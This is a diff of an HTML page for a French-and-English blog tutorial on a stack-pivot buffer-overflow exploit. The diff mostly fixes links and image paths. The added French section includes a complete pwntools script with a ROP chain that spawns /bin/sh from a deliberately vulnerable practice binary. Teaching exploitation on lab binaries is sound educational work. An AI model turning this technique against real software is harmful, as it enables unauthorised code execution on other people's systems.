@@ -103,14 +103,6 @@ Share</a>
 		 
 			 
 				<li>
-					<a href="/en/writeups/">
-						<span>Write-Ups</span>
-					</a>
-				</li>
-			 
-		 
-			 
-				<li>
 					<a href="/en/the_rest/">
 						<span>The Rest</span>
 					</a>
@@ -140,7 +132,7 @@ Share</a>
     <p>
       <section class="social">
 	
-	<a href="https://twitter.com/thelaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	<a href="https://twitter.com/TheLaluka" rel="me"><i class="rotate fab fa-twitter fa-lg" aria-hidden="true"></i></a>
 	
 	
 	
@@ -164,7 +156,7 @@ Share</a>
 	<a href="mailto:loukajc@gmail.com" rel="me"><i class="rotate fas fa-at fa-lg" aria-hidden="true"></i></a>
 	
 	
-  &nbsp;<a href="https://www.root-me.org/DeveLooper" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
+  &nbsp;<a href="https://www.root-me.org/Laluka" target="blank" class="linklogo"><div class="rotate rootme_logo logohover"></div></a>
   
 	
   &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="rotate aperikube_logo logohover"></div></a>
@@ -175,8 +167,6 @@ Share</a>
     <div class="langSection">
     
     <a rel="alternate" href="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/" hreflang="en" lang="en"><img src="/img/flag_en.png" alt="flag_en" class="logoFlag"/></a>
-    
-    <a rel="alternate" href="/fr/hacking/pwn_4of4_stak_pivot_to_ze_moon/" hreflang="fr" lang="fr"><img src="/img/flag_fr.png" alt="flag_fr" class="logoFlag"/></a>
     </div>
     <p class="copyright">
       &copy; 2021 Laluka.
@@ -200,7 +190,7 @@ Share</a>
       <i class="fas fa-calendar-alt"></i> May 10, 2018
     
     
-    <i class="fas fa-clock"></i> 7 min read
+    <i class="fas fa-clock"></i> 14 min read
     <i class="fas fa-globe"></i> translated<br/>
     <i class="fas fa-heart"></i>
     
@@ -234,15 +224,15 @@ Share</a>
 
 <p>You who stood strong during the previous 3 articles, I hope you are still ready!</p>
 
-<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/lets_go.jpg" alt="lets_go" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/lets_go.jpg" alt="lets_go" ></p>
 
 <h2 id="recon">Recon</h2>
 
-<p>The studied binary is downloadable <a href="/hacking/pwn_4of4_stack_pivot/vuln">here</a> !</p>
+<p>The studied binary is downloadable <a href="/hacking/pwn_4of4_stak_pivot_to_ze_moon/vuln">here</a> !</p>
 
 <p>Hello little program, what do you do for a living?</p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/recon.png" alt="recon" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/recon.png" alt="recon" ></p>
 
 <p>Meh, not much&hellip;</p>
 
@@ -262,7 +252,7 @@ Share</a>
 
 <p>Sorry / Not sorry, your vision is now blurry! <code>¯\_(ツ)_/¯</code></p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/cutter.png" alt="cutter" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/cutter.png" alt="cutter" ></p>
 
 <p>Brief presentation of the interface:</p>
 
@@ -302,15 +292,15 @@ Share</a>
 
 <p>So&hellip; Get it ?  °^°</p>
 
-<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/ffs.jpg" alt="ffs" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/ffs.jpg" alt="ffs" ></p>
 
 <p>A quick overview of the execution flow (from the main), still with Cutter :</p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/graph_call.png" alt="graph_call" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/graph_call.png" alt="graph_call" ></p>
 
 <p>Way too lazy to analyze it in depth&hellip; Pseudo code please?</p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pseudo_code.png" alt="pseudo_code" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/pseudo_code.png" alt="pseudo_code" ></p>
 
 <p>We immediately see that the decompilation is partial, we see a lot of interesting things, but we don&rsquo;t have a clear C code as we would like&hellip; Well, we&rsquo;ll deal with it!</p>
 
@@ -330,7 +320,7 @@ Share</a>
 
 <p>scanf corresponds to &ldquo;room name&rdquo;. Let&rsquo;s do a few tests just to be sure that we control the crash point:</p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/crash.png" alt="crash" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/crash.png" alt="crash" ></p>
 
 <p>Crash confirmed!</p>
 
@@ -348,9 +338,9 @@ push obj.username // address: 0x80eb2c0 char * fgets(...) // user entry
 
 <p>Now, the offset!</p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_create.png" alt="pattern_create" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/pattern_create.png" alt="pattern_create" ></p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/pattern_search.png" alt="pattern_search" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/pattern_search.png" alt="pattern_search" ></p>
 
 <p>The program crashes on a ret: Usual, classic, cool.</p>
 
@@ -362,7 +352,7 @@ push obj.username // address: 0x80eb2c0 char * fgets(...) // user entry
 
 <p>But&hellip; We have ESP + 4? Yes. Do we know how to add up? Yes.</p>
 
-<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/coincidence.gif" alt="coincidence" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/coincidence.gif" alt="coincidence" ></p>
 
 <p>I hope you&rsquo;re starting to see where we&rsquo;re going with this? :)</p>
 
@@ -429,11 +419,11 @@ p.interactive()
 
 <p>Let&rsquo;s run it, it would be crazy to see it working at the first time, wouldn&rsquo;t it? :O</p>
 
-<p><img class="img_full" src="/hacking/pwn_4of4_stack_pivot/run_exploit.png" alt="run_exploit" ></p>
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/run_exploit.png" alt="run_exploit" ></p>
 
 <p>Bim, shell, first try, too IZI mannnn!</p>
 
-<p><img class="img_med" src="/hacking/pwn_4of4_stack_pivot/like_a_boss.jpg" alt="like_a_boss" ></p>
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/like_a_boss.jpg" alt="like_a_boss" ></p>
 
 <p>Except&hellip; Except it&rsquo;s not as easy.</p>
 
@@ -449,7 +439,252 @@ p.interactive()
 
 <p>I am very, very happy with your many feedback!</p>
 
-<p>Wishing you a happy and successful pwn,</p>
+<h2 id="wishing-you-a-happy-and-successful-pwn">Wishing you a happy and successful pwn,</h2>
+
+<p>author: &ldquo;Laluka&rdquo;
+title: &ldquo;PWN <sup>4</sup>&frasl;<sub>4</sub> : Stack Pivot ToZeMoon !&rdquo;
+slug: &ldquo;pwn_4of4_stak_pivot_to_ze_moon&rdquo;
+date: 2018-05-10
+status: &ldquo;original&rdquo;</p>
+
+<h2 id="description-les-bases-de-l-exploitation-binaires-sont-normalement-acquises-c-est-parti-pour-une-exploitation-pratique-d-un-stack-pivot">description: &ldquo;Les bases de l&rsquo;exploitation binaires sont normalement acquises, c&rsquo;est parti pour une exploitation pratique d&rsquo;un stack pivot !&rdquo;</h2>
+
+<blockquote>
+<p>Petit ajout après la publication des articles :</p>
+
+<p>Ces quatres articles ont donné lieu à une conférence d&rsquo;introduction au pwn à la HitchHack 2018. Elle résume les 3 premiers articles mais rentre moins dans le détail. Si ce format vous convient mieux, les slides sont téléchargables <a href="/hacking/pwn_1of4_buffer_overflow/slides_conf_123_pwned.pdf">ici</a> et la vidéo (francais uniquement) ici :</p>
+</blockquote>
+
+
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+  <iframe src="//www.youtube.com/embed/hmt8M9YLwTg" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" allowfullscreen title="YouTube Video"></iframe>
+</div>
+
+
+<h2 id="route-du-pwn-dernier-article-d-introduction">Route du pwn, dernier article d&rsquo;introduction !</h2>
+
+<p>Je vous avais promis du lourd pour le final, chose dite, chose due !</p>
+
+<p>L&rsquo;exploit ne sera pas très long, mais en prévision : Une technique sympa, du reverse, et un outil open source qui vend du rêve !</p>
+
+<p>Vous qui avez tenu les 3 articles précédents, j&rsquo;espère que vous êtes toujours chauds !</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/lets_go.jpg" alt="lets_go" ></p>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Le binaire étudié est téléchargable <a href="/hacking/pwn_4of4_stak_pivot_to_ze_moon/vuln">ici</a> !</p>
+
+<p>Bonjour petit programme, que fais-tu dans la vie ?</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/recon.png" alt="recon" ></p>
+
+<p>Meh, not much&hellip;</p>
+
+<p>On sort le premier tool : Radare2 !</p>
+
+<p>J&rsquo;ai hésité entre le présenter en ligne de commande, ou via son interface graphique. Mais il y a tellement de développement et d&rsquo;efforts faits sur leur GUI que je vais présenter cette version.</p>
+
+<p>Je vous présente donc Cutter, basé sur radare2, qui est un outil de reverse engineering très pointu. Pour la petite histoire, radare2 est voulu le plus standalone (indépendant) possible, c&rsquo;est à dire que vous pouvez l&rsquo;utiliser sur un device / une architecture particulière, même si celle ci n&rsquo;a pas le moindre outil / paquet préinstallé. Il vous suffit de le recompiler in situ ou le cross-compiler. En &lsquo;prime&rsquo;, plein de tools d&rsquo;admin-sys classiques y sont intégrés ! Le paradis pour du embedded device, du remote sur un tel / une montre, ou que sais-je encore.</p>
+
+<p>Il est open source, et son développement très actif, préférez donc une installation via leur git&hellip; :)</p>
+
+<p>Site officiel ici : <a href="https://rada.re/r/">https://rada.re/r/</a></p>
+
+<p>Il est bourré d&rsquo;easter eggs, si vous avez du temps à perdre, enjoy ! ;)</p>
+
+<p>Je sais que le screenshot est difficilement lisible en taille normal, mais j&rsquo;ai mis la résolution source, et j&rsquo;ai check sur tel et pc, en zoomant c&rsquo;est pixel-perfect !</p>
+
+<p>Deso / Pas deso, il faut voir plus gros ! <code>¯\_(ツ)_/¯</code></p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/cutter.png" alt="cutter" ></p>
+
+<p>Présentation brève de l&rsquo;interface :</p>
+
+<ul>
+<li>A gauche :</li>
+</ul>
+
+<p>Les différentes fonctions du programme. On a de la chance, le programme n&rsquo;a pas été &ldquo;strip&rdquo;, il contient donc encore le nom des fonctions. Sinon, nous n&rsquo;aurions eu que des noms génériques peu agréables à utiliser.</p>
+
+<ul>
+<li>A droite :</li>
+</ul>
+
+<p>Des informations sur la ligne en cours d&rsquo;inspection. Pas très utile pour le moment.</p>
+
+<ul>
+<li>En haut :</li>
+</ul>
+
+<p>Un apercu de la structure du programme. Code, données, schémas reconnaissables pour de la crypto, &hellip;</p>
+
+<ul>
+<li>En bas :</li>
+</ul>
+
+<p>Une console de logs (avec déjà un easter egg !) et les différentes sections du programme et leurs infos.</p>
+
+<ul>
+<li>Au milieu :</li>
+</ul>
+
+<p>L&rsquo;outil d&rsquo;analyse en cours d&rsquo;utilisation.</p>
+
+<p>Ici, le dashboard nous indique fièrement : Ouiiii, alors j&rsquo;ai un peu cherchéééé, et tu voisss, j&rsquo;ai trouvé que ta cible là, eh bien c&rsquo;est un ELF, en 32 bits, initialement codé en C, sans stack canary, sans protection cryptographique, sa stack est NX, le PIC est désactivé. Il n&rsquo;est pas strippé, et il est compilé en statique ! :D</p>
+
+<p>Si ce n&rsquo;est pas classe toutes ces infos d&rsquo;un claquement de doigt !</p>
+
+<p>Du coup&hellip; Vous l&rsquo;aver ? °^°</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/ffs.jpg" alt="ffs" ></p>
+
+<p>Petit apercu du flot d&rsquo;exécution (à partir du main), toujours via Cutter :</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/graph_call.png" alt="graph_call" ></p>
+
+<p>Un peu la flemme d&rsquo;analyser ca en profondeur&hellip; Pseudo code s&rsquo;il vous plaît ?</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/pseudo_code.png" alt="pseudo_code" ></p>
+
+<p>On voit tout de suite que la décompilation est partielle, on voit plein de choses intéressantes, mais on n&rsquo;a pas un code C clair comme on aimerait&hellip; Bah on va faire avec !</p>
+
+<p>Il y a de la matière, il est donc temps d&rsquo;apprendre une manière de voir les choses très efficace pour le hacking en général : Sources and Sinks !</p>
+
+<p>Petite ref à la chaine youtube de <a href="https://www.youtube.com/watch?v=ZaOtY4i5w_U">LiveOverflow</a>, contenu de qualiteyyyy ! Tout ce qu&rsquo;il fait (hacking, pwn, web, reverse, random, &hellip;) est d&rsquo;une qualité incroyable, et il a justement parlé de la méthode SoSi, donc faites y un tour !</p>
+
+<p>En bref, que contrôlons-nous (inputs), et que voulons-nous atteindre (fonctions dangereuses).</p>
+
+<p>Ici, on veut faire un buffer overflow. On cherche donc des fonctions vulnérables et des entrées.</p>
+
+<ul>
+<li><p>Sources : admin name, room name, temperature</p></li>
+
+<li><p>Sinks : scanf&hellip; scanf ? scanf !</p></li>
+</ul>
+
+<p>scanf correspond à &ldquo;room name&rdquo;. On fait un ou deux essais quand même pour être sûr de contrôler le point de crash :</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/crash.png" alt="crash" ></p>
+
+<p>Point de crash confirmé !</p>
+
+<p>Avant de chercher l&rsquo;offset, il y a une chose supplémentaire à repérer, qui nous servira <strong>PEUT ÊTREEEEE</strong> par la suite&hellip; Je dis ca je dis rien&hellip; Pour les chercheurs, c&rsquo;est dans le premier screenshot de code, pour les autres, la lecture continue :</p>
+
+<p><em>-[ SPOIL ]-</em></p>
+
+<p>On lit le code suivant :</p>
+
+<pre><code>push 0x3ff // taille : 1023
+push obj.username // adresse : 0x80eb2c0 char * fgets(...) // saisie utilisateur
+</code></pre>
+
+<p>Autrement dit, le programme va toujours mettre au même endroit (0x80eb2c0) jusqu&rsquo;à 1023 bytes saisis par l&rsquo;utilisateur&hellip; Ca peut se justifier&hellip; Mais ca peut être utile non ? Who knows ! :)</p>
+
+<p>Maintenant, l&rsquo;offset !</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/pattern_create.png" alt="pattern_create" ></p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/pattern_search.png" alt="pattern_search" ></p>
+
+<p>On crash sur un ret : Habituel, classique, cool.</p>
+
+<p>On a ESP, bien. Wait&hellip; What ? On a ESP&hellip; + 4 ?</p>
+
+<p>Eh oui, le fameux pattern est suffisamment bien pensé pour être détecté même si il a été altéré (un peu) !</p>
+
+<p>Cela signifie qu&rsquo;entre le moment où on overflow, et le moment où on exécute l&rsquo;instruction ret, la pile (enfin, notre ESP dans la pile) a été altéré.</p>
+
+<p>Mais&hellip; On a ESP + 4 ? Oui. On sait faire une addition ? Oui.</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/coincidence.gif" alt="coincidence" ></p>
+
+<p>Vous commencez, je l&rsquo;espère, à voir où je veux en venir ? :)</p>
+
+<p>On sait où stocker des bytes. On contrôle EIP vu qu&rsquo;on contrôle ESP sur un ret. On connaît l&rsquo;offset, et on sait comment modifier ESP pour qu&rsquo;il prenne la valeur de notre choix&hellip; Yapluka !</p>
+
+<p>C&rsquo;est là que je nomme la technique que nous allons utiliser, le Stack Pivot !</p>
+
+<p>On va faire pivoter l&rsquo;exécution de notre programme, en lui faisant croire que la stack est à l&rsquo;emplacement du username, que nous pouvons définir à notre guise, bien entendu.</p>
+
+<p>Je passe la préparation de la ropchain car c&rsquo;est exactement comme dans l&rsquo;article précédent, on va tout de suite faire notre exploit :</p>
+
+<pre><code class="language-python">#!/usr/bin/env python2
+
+from pwn import *
+
+# Setting up
+context.log_level = &quot;debug&quot;
+
+ropchain = ''
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '/bin'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea344)  # @ .data + 4
+ropchain += p32(0x080bb696)  # popayloadeax ; ret
+ropchain += '//sh'
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x08097276)  # mov dword ptr [edx], eax ; popayloadebx ; ret
+ropchain += p32(0x41414141)  # padding
+ropchain += p32(0x080481a9)  # popayloadebx ; ret
+ropchain += p32(0x080ea340)  # @ .data
+ropchain += p32(0x080c18cc)  # popayloadecx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x0806ebaa)  # popayloadedx ; ret
+ropchain += p32(0x080ea348)  # @ .data + 8
+ropchain += p32(0x080545b0)  # xor eax, eax ; ret
+ropchain += p32(0x0807b64f) * 11 # inc eax ; ret
+ropchain += p32(0x080494b1)  # int 0x80
+
+p = process(&quot;./vuln&quot;)
+p.recv()
+p.sendline(ropchain)
+p.recv()
+&quot;&quot;&quot;
+0x08048fc9 &lt;+397&gt;:	lea    esp,[ecx-0x4]
+0x08048fcc &lt;+400&gt;:	ret
+On ajoute donc 4 a user name pour compenser le -0x4
+&quot;&quot;&quot;
+usernameAddr = 0x80EB2C0
+ESP = usernameAddr + 4 # Fix the offset before ret
+p.sendline(&quot;1&quot; * 28 + p32(ESP))
+p.recv()
+p.sendline(&quot;10&quot;)
+p.recv()
+p.interactive()
+</code></pre>
+
+<p>On le lance, ce serait quand même fou que ca fonctionne du premier coup non ? :O</p>
+
+<p><img class="img_full" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/run_exploit.png" alt="run_exploit" ></p>
+
+<p>Bim, shell, first try, too IZI mannnn !</p>
+
+<p><img class="img_med" src="/en/hacking/pwn_4of4_stak_pivot_to_ze_moon/like_a_boss.jpg" alt="like_a_boss" ></p>
+
+<p>Sauf que&hellip; Sauf que non.</p>
+
+<p>En lisant un article comme ca, ca n&rsquo;a pas l&rsquo;air si complexe que ca, un peu fouilli à la rigueur. Sauf que pour chaque exploit, à moins d&rsquo;être vraiment un monstre (coucou Geluchat, Blackndoor, Pixis, Klaoude, Antoxyde, Ethnical, &hellip;), c&rsquo;est des heures, des jours (enfin, nuits, on se comprend ;) ) qui y passent. Mais s&rsquo;acharner pendant longtemps pour finalement y arriver, quelle satisfaction !</p>
+
+<p>Si vous aussi vous souhaitez vous lancer, je vous conseille l&rsquo;excellente suite d&rsquo;exercice <a href="https://exploit-exercises.com/protostar/">Protostar</a>.</p>
+
+<p>Ainsi que le classique <a href="https://www.root-me.org/">root-me</a> que j&rsquo;affectionne particulièrement. Faites quand même attention, ce site dévorera vos nuits&hellip; =]</p>
+
+<p>Mais bien que j&rsquo;adore ce site, je ne le trouve pas très approprié pour découvrir l&rsquo;exploit binaire. Mais pour toutes les autres catégories de hacking &ldquo;classique&rdquo;, foncez, c&rsquo;est du pain béni ! ;)</p>
+
+<p>C&rsquo;est ainsi que se conclu cette introduction au pwn, j&rsquo;espère qu&rsquo;elle vous a plu et que vous y avez appris des choses (au moins un peu ? :D )</p>
+
+<p>Vos nombreux retours me font très très plaisir ! ^.^</p>
+
+<p>En vous souhaitant un pwn heureux et fructueux,</p>
 
   </div>
   
@@ -462,8 +697,8 @@ p.interactive()
     </a>
     
     
-    <a href="/en/hacking/grehack_2018/" class="post--navigation-next">
-      <span class="navigation-tittle">GreHack 2018</span>
+    <a href="/en/hacking/excess_ess_1/" class="post--navigation-next">
+      <span class="navigation-tittle">Security Fest - Excess ess 1</span>
       <i aria-hidden="true" class="fa fa-chevron-right"></i>
     </a>
     
